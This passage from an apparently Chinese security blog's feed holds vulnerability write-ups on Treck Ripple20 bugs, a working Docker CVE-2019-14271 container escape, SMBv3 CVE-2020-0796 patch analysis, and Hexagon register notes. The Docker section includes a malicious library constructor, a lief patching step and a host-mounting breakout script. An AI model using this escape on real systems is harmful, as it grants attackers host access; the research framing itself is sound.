*&#x2F;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>正如我们所看到的，通过确保UDP长度字段等于pktuChainDataLength字段减去内部IP报头的大小，我们可以避免这种类型的修剪(不要与易受攻击的流混淆)。<br>总而言之：如果我们的设备上有UDP端口在监听，我们可以快速发送数据包，这样套接字接收队列就不会为空。同时，我们将发送会触发该漏洞的零碎UDP数据包，并勾选几个复选框。我们预期的结果是使用tfGetSharedBuffer在堆上分配一个小缓冲区，然后tfCopyPacket会使其溢出。</p><h2 id="CVE-2020-11898"><a href="#CVE-2020-11898" class="headerlink" title="CVE-2020-11898"></a>CVE-2020-11898</h2><p>前面提到了，Treck TCP/IP不能正确处理IP-in-IP隧道上传入的IPv4片段。这还可能允许未经验证的攻击者从 heap 中泄漏内存。</p><p>如果 tfIcmpErrPacket 将越界数据复制到错误数据包中，则可作为信息泄漏漏洞来被利用。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630213503.png" title="image-20200630213501855" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630213503.png" alt="image-20200630213501855"></a></p><p>参考如上实例：</p><p>当网络堆栈接收到这两个片段时，它会使用tfIpReAssemblePacket重新组装它们。此函数使用tsUserPacket结构中的字段pktuLinkNextPtr链接两个片段。如果启用了隧道，则IP层接下来将在函数tfIpIncomingPacket中处理内部IP数据包。</p><p>内部IP分组通过IP报头健全性检查，因为只考虑tsUserPacket的pktuChainDataLength字段(而不是pktuLinkDataLength)。此外，由于在标准IP报头(20字节)之后有4个空字节，并且空字节表示选项列表的末尾(见<a href="https://tools.ietf.org/html/rfc791)%EF%BC%8C%E5%9B%A0%E6%AD%A4IP%E9%80%89%E9%A1%B9%E8%A7%A3%E6%9E%90%E9%80%9A%E8%BF%87%E3%80%82">https://tools.ietf.org/html/rfc791)，因此IP选项解析通过。</a></p><p>如果内部IP数据包的IP报头中的总长度字段严格小于链数据长度，则网络堆栈将尝试修剪数据包。如前文中所述，修剪是通过将字段pktuLinkDataLength和pktuChainDataLength设置为相同的值，即总长度字段(在我们的示例中为100)来实现的。</p><p>由于内部IP数据包包含无效的IPv4协议号(协议0)，因此网络堆栈将通过发送类型为3(目的地不可达)代码为2(协议不可达)的ICMP错误消息来拒绝该数据包。</p><p>负责创建错误数据包的函数是tfIcmpErrPacket。它会分配一个新数据包，初始化一些ICMP字段，并最终从违规数据包(内部IP数)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">length   =   (packetPtr-&gt;pktUserStruct).pktuLinkDataLength; <span class="keyword">if</span> (headerLengthInBytes + <span class="number">8</span> &lt;= length) &#123;</span><br><span class="line">length = headerLengthInBytes + <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(icmpErrHdrPtr + <span class="number">8</span>, pktIpHdrPtr, length);</span><br></pre></td></tr></table></figure><p>正如我们所看到的，tfIcmpErrPacket通过取IP报头长度(以字节为单位)加8(在我们的示例中，60+8=68)和pktuLinkDataLength字段(在本例中修剪为100)之间的最小值来计算要复制的字节数。由于违规数据包的第一个片段的实际链接数据长度为24(不是100)，tfIcmpErrPacket将复制68−24=44字节从堆中泄漏的数据。</p><p>此漏洞可用于在启用漏洞缓解(如ASLR)时，以及在没有调试器的情况下，利用CVE2020-11896和其他RCE漏洞进行攻击。</p><p>2020-7-2 更新</p><p>试了下文章写的 poc 发现并没有任何返回，但是机器直接打崩了。等个可以调试的设备。</p><h2 id="关于-treck-协议栈扫描"><a href="#关于-treck-协议栈扫描" class="headerlink" title="关于 treck 协议栈扫描"></a>关于 treck 协议栈扫描</h2><p>看到 启明星辰 ADLAB 的公众号提到了 Treck协议栈自定义了类型为165(0xa5)的ICMP包，并一旦收到165的ICMP包会回复类型为166的ICMP包响应。<a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630215750.webp" title="img" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630215750.webp" alt="img"></a></p><p>由于手头没有相应的设备，以及查下公司的打印机相关设备，似乎都没有在官方公告的影响范围内，所以用这个方法跑了下，就到目前写这篇文章为止了，大概跑了1000多个 IP ，没有任何返回，目前猜测，公网 scan 的 话可能会被网关给 drop 掉。</p><p>2020-7-2 更新：</p><p>昨天发现上海公司有一台设备，测试的时候发现 scapy 写的扫描是有问题的，scapy 本身似乎对包进行了判断，导致拿不到回包，所以 github 上公开的扫描应该是不行，另外一点 ttl 如果太小似乎也会被drop掉(在多层路由的情况下)</p><p>这里贴一下我用 socket 写的脚本</p><p>设置 ICMP_ECHO_REQUEST 为0xa5 ，然后再收包判断 type</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200702112743.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200702112743.png"></a></p><p>例：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200702214200.png" title="image-20200702113751286" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200702214200.png" alt="image-20200702113751286"></a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.jsof-tech.com/wp-content/uploads/2020/06/JSOF_Ripple20_Technical_Whitepaper_June20.pdf">https://www.jsof-tech.com/wp-content/uploads/2020/06/JSOF_Ripple20_Technical_Whitepaper_June20.pdf</a></p><p><a href="https://mp.weixin.qq.com/s/2F1-35HIk126crowAh9LLw">https://mp.weixin.qq.com/s/2F1-35HIk126crowAh9LLw</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2020-11896" scheme="https://bestwing.me/tags/CVE-2020-11896/"/>
    
    <category term="CVE-2020-11898" scheme="https://bestwing.me/tags/CVE-2020-11898/"/>
    
    <category term="Treck" scheme="https://bestwing.me/tags/Treck/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-14271 docker escape</title>
    <link href="https://bestwing.me/CVE-2019-14271-docker-escape.html"/>
    <id>https://bestwing.me/CVE-2019-14271-docker-escape.html</id>
    <published>2020-06-02T16:00:00.000Z</published>
    <updated>2020-06-22T18:00:38.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<blockquote><p><a href="https://github.com/moby/moby/pull/39612">https://github.com/moby/moby/pull/39612</a></p></blockquote><h2 id="github-issue："><a href="#github-issue：" class="headerlink" title="github issue："></a>github issue：</h2><p>Initialize nss libraries in Glibc so that the dynamic libraries are loaded in the host environment not in the chroot from untrusted files.</p><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-14271">CVE-2019-14271</a> may allow unprivileged access to host system while copying files from a malicious container image with <code>docker cp</code> command.</p><p><strong>Affected versions</strong>: v19.03.0. Older Docker versions are not affected by this issue.</p><p>This fix is included in the already released <a href="https://github.com/docker/docker-ce/releases/v19.03.1">Docker v19.03.1</a>. Users of Docker v19.03.0 are advised to upgrade.</p><p>The patch was previously reviewed internally by maintainers under GitHub security advisory.If you find security issues in Moby, please follow responsible disclosure guidelines by sending an email to <a href="mailto:security@docker.com">security@docker.com</a>.</p><p>yum list docker-ce –showduplicates|sort –r</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这两天和 @explorer 一起看了下这个洞，以及好久没更博客了，随手写个文章记录下：</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞成因是由于，<code>docker cp</code>  进行拷贝的时候，将 <code>docker-tar</code> 此进程先 chroot 到容器内，然而此时使用的 so 文件也是容器内的，而 <code>docker-tar</code> 进程本身没有容器化，意味着仍然拥有高权限，所以此时如果容器内的 so 被恶意篡改，那么可能造成 docker 容器逃逸 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp cve-2019-14271:/lib ./lib &amp; <span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> ps -auxf |grep -v grep|grep docker-tar|tr -s <span class="string">&#x27; &#x27;</span>|cut -d <span class="string">&#x27; &#x27;</span> -f 2|xargs -I&#123;&#125; ls -al /proc/&#123;&#125;/root ; <span class="keyword">done</span> |  uniq</span><br></pre></td></tr></table></figure><p>通过上述命令可以清晰的看到 chroot 过程</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183320.png" title="chroot" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183320.png" alt="chroot"></a></p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>安装 apt 依赖包，用于通过HTTPS来获取仓库: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg-agent \</span><br><span class="line">    software-properties-common</span><br></pre></td></tr></table></figure><p>添加 Docker 的官方 GPG 密钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><p>使用以下指令设置稳定版仓库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository \</span><br><span class="line">   <span class="string">&quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="string">  <span class="subst">$(lsb_release -cs)</span> \</span></span><br><span class="line"><span class="string">  stable&quot;</span></span><br></pre></td></tr></table></figure><p>列出 <code>docker-ce</code> 的所有版本 </p><p><code>apt-cache madison docker-ce</code></p><p>安装有漏洞的版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install docker-ce=5:19.03.0~3-0~ubuntu-bionic docker-ce-cli=5:19.03.0~3-0~ubuntu-bionic containerd.io</span><br></pre></td></tr></table></figure><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>由于是 <code>docker-cp</code> 这个进程出现的问题，其本身用到了 <code>libnsss_*.so*</code> 的一些库，所以我们选择对其进程 so 劫持</p><p>劫持代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">void</span> __attribute__((constructor)) back() </span><br><span class="line">&#123;     </span><br><span class="line"> FILE *proc_file = fopen(<span class="string">&quot;/proc/self/exe&quot;</span>,<span class="string">&quot;r&quot;</span>);   </span><br><span class="line"> <span class="keyword">if</span> (proc_file !=<span class="literal">NULL</span>)    &#123;   </span><br><span class="line">                fclose(proc_file);       </span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;        </span><br><span class="line">system(<span class="string">&quot;/breakout&quot;</span>);        </span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于程序在执行的时候，有chroot 过程，避免其他进程也使用了这些库，所以先判断 <code>/proc/self/exe</code> 是否可读，如果可读则不是我们的目标进程</p><p>另外这里用到了 <code>constructor</code> 魔术方法，之前在 geekpwn maxhub 利用的时候也提到了，这里不再赘述。</p><p>patch <code>libss_files-2.27.so</code> 代码, 这里使用 lief 进行 patch</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> lief</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lief.parse(<span class="string">&quot;./libnss_files-2.27.so&quot;</span>)</span><br><span class="line">&lt;lief.ELF.Binary object at <span class="number">0x7f749704f030</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a= lief.parse(<span class="string">&quot;./libnss_files-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.add_library(<span class="string">&quot;/tmp/a.out&quot;</span>)</span><br><span class="line">&lt;lief.ELF.DynamicEntryLibrary object at <span class="number">0x7f74963d9ae8</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.write(<span class="string">&quot;libnss_files-2.27.so.patch&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后将上面的 c 代码进行编译</p><p><code>gcc -shared -fPIC backdoor.c</code></p><p>首先，创建一个容器作为攻击目标</p><p><code>docker run --rm -it --name cve-2019-14271 ubuntu:18.04 /bin/bash</code></p><p>然后将修改后的 so 和利用的脚本放入容器内：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker cp a.out cve-2019-14271:/tmp </span><br><span class="line">docker cp breakout cve-2019-14271:/ </span><br><span class="line">docker cp libnss_files.so.2_patch cve-2019-14271:/lib/x86_64-linux-gnu/libnss_files-2.27.so</span><br></pre></td></tr></table></figure><p>此时 breakout的内容为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir /host_fs</span><br><span class="line">mount -t proc none /proc</span><br><span class="line"><span class="built_in">cd</span> /proc/1/root</span><br><span class="line">mount --<span class="built_in">bind</span> . /host_fs</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hack by chaitin&quot;</span> &gt; /proc/1/root/tmp/hack</span><br></pre></td></tr></table></figure><p>则意味着，攻击成功有两个标志：</p><p>1、容器内的 /host_fs 映射了容器外的内容</p><p>2、容器外的 tmp 的 hack 写入 <code>hack by chaitin</code></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183342.png" title="mount-root-fs-to" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183342.png" alt="mount-root-fs-to"></a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183355.png" title="docker%20CVE%202019%2014271%20040822a50127454aac6713a0750ab5fb/Untitled%202.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183355.png" alt="docker%20CVE%202019%2014271%20040822a50127454aac6713a0750ab5fb/Untitled%202.png"></a></p><h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2><p><a href="https://github.com/moby/moby/pull/39612/files/a316b10dab79d9298b02c7930958ed52e0ccf4e4#diff-7d8fc0dcb0916621d523276add8210c2](https://github.com/moby/moby/pull/39612/files/a316b10dab79d9298b02c7930958ed52e0ccf4e4#diff-7d8fc0dcb0916621d523276add8210c2)">patch diif</a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183400.png" title="patch-diff" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183400.png" alt="patch-diff"></a></p><p>补丁新增了 <code>init</code> 函数，强制进程进入到容器内的时候，先加载容器外的 so 文件</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/">https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/</a></p></blockquote></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
    <summary type="html">CVE-2019-14271-analyze</summary>
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
    <category term="CVE-2019-14271" scheme="https://bestwing.me/tags/CVE-2019-14271/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-0796 SMBv3 漏洞分析</title>
    <link href="https://bestwing.me/CVE-2020-0796-analysis.html"/>
    <id>https://bestwing.me/CVE-2020-0796-analysis.html</id>
    <published>2020-03-12T16:00:00.000Z</published>
    <updated>2020-12-05T18:52:20.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="CVE-2020-0796-SMBv3-漏洞分析"><a href="#CVE-2020-0796-SMBv3-漏洞分析" class="headerlink" title="CVE-2020-0796 SMBv3 漏洞分析"></a>CVE-2020-0796 SMBv3 漏洞分析</h1><p>3月13日 凌晨左右 ，微软放了这个漏洞的补丁…所以稍微分析一下他的补丁</p><h2 id="Bindiff"><a href="#Bindiff" class="headerlink" title="Bindiff"></a>Bindiff</h2><p>通过 bindiff 比较发现一个函数，且名字也蛮可疑的..</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032004.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032004.png" style="zoom: 50%;" /></a><p>这个函数名叫 <code>Srv2DecompressData</code> 实际上和漏洞描述其实也差不多..</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032123.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032123.png" style="zoom: 50%;" /></a><p>似乎是加了检查..我们 打开IDA来比对一下 两者的差别..</p><h2 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h2><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032244.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032244.png"></a></p><p>左边是有漏洞的版本，右边是 Patch 后的版本 .. 比对了一下发现似乎增加了一个检查..尤其是增加的一个叫</p><p><code>RtlULongAdd</code> 的函数..</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RtlULongAdd(ULONG ulAugend, ULONG ulAddend, ULONG *pulResult)</span><br></pre></td></tr></table></figure><p>该函数的参数是 两个似乎 recve 的数据 以及一个变量..</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS __stdcall <span class="title">RtlULongAdd</span><span class="params">(ULONG ulAugend, ULONG ulAddend, ULONG *pulResult)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ULONG v3; <span class="comment">// eax</span></span><br><span class="line">  ULONG v4; <span class="comment">// edx</span></span><br><span class="line">  NTSTATUS result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v3 = ulAugend + ulAddend;</span><br><span class="line">  v4 = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt;= ulAugend )</span><br><span class="line">    v4 = v3;</span><br><span class="line">  result = v3 &lt; ulAugend ? <span class="number">0xC0000095</span> : <span class="number">0</span>;</span><br><span class="line">  *pulResult = v4;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看了一下这个  判断了  ulAugend + ulAddend 相加后的和是否小于其中一个 加数..如果是则将其中一个赋值给返回值..从这里大概能初步判断是个什么漏洞了..基本能猜测是个  整型溢出..</p><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>我们来看一下未打补丁的版本…</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032734.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032734.png"></a></p><p>看了一下..这里是将原本个值直接相加，并没有进行checkl… 然后分配内存..如果有问题 …应该是这里分配的内存太小..导致后续的缓冲区溢出吧？</p><p>由于我对这两个值不是很熟悉..所以这个时候开始查资料..</p><p>这个时候发现已经有人发文了…参考链接最后贴后面..</p><p>可以知道的是..这里的值一个是 OriginalCompressedSegmentSize  一个是 Offset/Length，他们 描述如下:</p><blockquote><ol><li>OriginalCompressedSegmentSize (4 bytes) The size, in bytes, of the uncompressed data segment.</li><li>Offset/Length (4 bytes) If SMB2_COMPRESSION_FLAG_CHAINED is set in Flags field, this field MUST be interpreted as Length. The length, in bytes, of the compressed payload. Otherwise, this field MUST be interpreted as Offset. The offset, in bytes, from the end of this structure to the start of compressed data segment.</li></ol></blockquote><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033313.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033313.png"></a></p><p>然后做了什么事情呢？</p><p>看代码，将分配的内存 用 SmbCompressionDecompress 这个函数进行处理</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033424.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033424.png"></a></p><p>我在 srvnet 里找到了 SmbCompressionDecompress 这个函数</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033623.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033623.png"></a></p><p>然后又调用了 <code>RtlDecompressBufferEx2</code> 这个函数..最后调的是 <code>RtlDecompressBufferXpressLz</code> 这个函数…</p><p>这个函数在<code>ntoskrnl. exe</code> 里</p><p>这个函数做的是事情就是..</p><p><code>memcpy(ptr,src,len)</code></p><p>ptr 是由 <code>SrvNetAllocateBuffer</code>分配的<code>UncompressBuffer</code>，<code>len</code> 是从smb 包解析的解压数据的大小，这个值是攻击者可控的， 由于前面没有检查..所以我们传入一个很大的值，使其触发整型溢出.分配一个较小的内存…此时 len又是一个大的值..所以导致了缓冲区溢出</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200314024525.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200314024525.png"></a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/1d435f21-9a21-4f4c-828e-624a176cf2a0">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/1d435f21-9a21-4f4c-828e-624a176cf2a0</a></p><p><a href="http://blogs.360.cn/post/CVE-2020-0796.html">http://blogs.360.cn/post/CVE-2020-0796.html</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2020-0796" scheme="https://bestwing.me/tags/CVE-2020-0796/"/>
    
  </entry>
  
  <entry>
    <title>Hexagon 学习 --- 寄存器篇</title>
    <link href="https://bestwing.me/Herxagon%20%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0.html"/>
    <id>https://bestwing.me/Herxagon%20%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0.html</id>
    <published>2020-03-11T16:00:00.000Z</published>
    <updated>2020-03-12T07:31:24.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="Hexagon-学习"><a href="#Hexagon-学习" class="headerlink" title="Hexagon 学习"></a>Hexagon 学习</h1><p>就是按照手册过了一遍，仅仅是个人的笔记。</p><h2 id="Registers-寄存器"><a href="#Registers-寄存器" class="headerlink" title="Registers 寄存器"></a>Registers 寄存器</h2><blockquote><p>The Hexagon processor has two sets of registers: general registers and control registers. The general registers include thirty-two 32-bit registers (named R0 through R31) which can be accessed either as single registers or as aligned 64-bit register pairs. The general registers are used to contain all pointer, scalar, vector, and accumulator data. The control registers include special-purpose registers such as program counter, status register, loop registers, etc.</p></blockquote><p>分为通用寄存器和控制寄存器， 通用寄存器包括32个32位寄存器，以R0到R31命名，另外这里提到了可以通过定义一个寄存器对来表示一个64位寄存器..例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R1：0 &#x3D;memd(R3)          &#x2F;&#x2F;导入双字</span><br><span class="line">R7:6&#x3D;valignb(R9:8,R7:6,#2)   &#x2F;&#x2F;适量对齐</span><br></pre></td></tr></table></figure><h3 id="寄存器对"><a href="#寄存器对" class="headerlink" title="寄存器对"></a>寄存器对</h3><p>下图显示了寄存器对的结构</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312032950.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312032950.png"></a> </p><p>在这些通用寄存器当中，R29-R32被用来支持子程序的调用以及程序栈，这些寄存器可以无保留的被子程序调用或栈指令改变。在编程环境中，R29-R32可以用符号来表示。例如：</p><p>  SP=add(SP,#-8)    //sp是R29的别名</p><p>  Allocfram             //更改寄存器R29(SP)以及R30（FP）</p><p>  call init                //更改LR（R31）</p><h3 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h3><p>下图显示了这些别名后的通用寄存器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">For example:</span><br><span class="line">SP &#x3D; add(SP, #-8) &#x2F;&#x2F; SP is alias of R29</span><br><span class="line">allocframe &#x2F;&#x2F; Modifies SP (R29) and FP (R30)</span><br><span class="line">call init &#x2F;&#x2F; Modifies LR (R31)</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033255.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033255.png"></a></p><p>在这些通用寄存器当中，R29-R32被用来支持子程序的调用以及程序栈，这些寄存器可以无保留的被子程序调用或栈指令改变。在编程环境中，R29-R32可以用符号来表示。</p><h3 id="控制寄存器"><a href="#控制寄存器" class="headerlink" title="控制寄存器"></a>控制寄存器</h3><p>Hexagon处理器包含了一系列的32位的控制寄存器，这些寄存器可以让我们对处理器中的PC，硬件回路以及矢量分支预测进行操作。</p><p> 与通用寄存器不同，控制寄存器中有些特殊的控制寄存器可用来当做操作数，有时候寄存器可以被转换成指令从而被用作操作数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">For example:</span><br><span 